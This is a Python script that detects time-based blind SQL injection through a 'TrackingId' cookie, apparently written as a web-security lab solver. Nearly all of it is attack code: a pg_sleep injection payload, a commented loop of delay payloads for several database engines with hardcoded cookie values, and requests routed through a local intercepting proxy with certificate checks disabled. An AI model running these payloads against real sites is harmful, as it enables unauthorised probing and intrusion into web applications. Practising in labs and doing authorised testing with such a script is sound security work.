
import sys
import requests
import urllib.parse
import urllib3
from urllib3.util.url import BRACELESS_IPV6_ADDRZ_RE

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies ={'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}

def blind_sqli(url, tracking_cookie):
    sqli_payload = "' || (SELECT pg_sleep(10))--"
    sqli_payload_encoded = urllib.parse.quote(sqli_payload)
    cookies = {'TrackingId': tracking_cookie + sqli_payload_encoded}
    r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
    if int(r.elapsed.total_seconds()) >= 10:
        print("SQLI successful. It is vulnerable to time-delayed SQL.")
    else:
        print("It is not vulnerable to SQL Injection.")

#  for multiple payloads:

# sqli_payloads = ["' || (SELECT sleep(10))--", "' || (SELECT pg_sleep(10))--", "' || (WAITFOR DELAY '0:0:10')--", "' || (dbms_pipe.receive_message(('a'),10))--"] 
#   for payload in sqli_payloads:
#     sqli_payload_encoded = urllib.parse.quote(payload)
#     cookies = {'TrackingId': 'V3AP2ZxmIZbS3G2c'+ sqli_payload_encoded, 'session': 'VArfFFpnn8WWbQg6F17O1ZWUmDi6aP3P'}
#     r = requests.get(url, cookies=cookies, verify=False)
#     if int(r.elapsed.total_seconds()) >= 10:
#       print("[+] Vulnerable to blind-based SQL injection, successful query injected: "+payload)
#       break
#     else:
#       print("[-] Query "+payload+ " failed")


if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        tracking_cookie = sys.argv[2].strip()
    except IndexError:
        print(f"[*] Usage: {sys.argv[0]} <url>")
        print(f"[*] Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    print("[+] Checking if the cookies is vulnerable to time delay attack....")
    blind_sqli(url, tracking_cookie)

    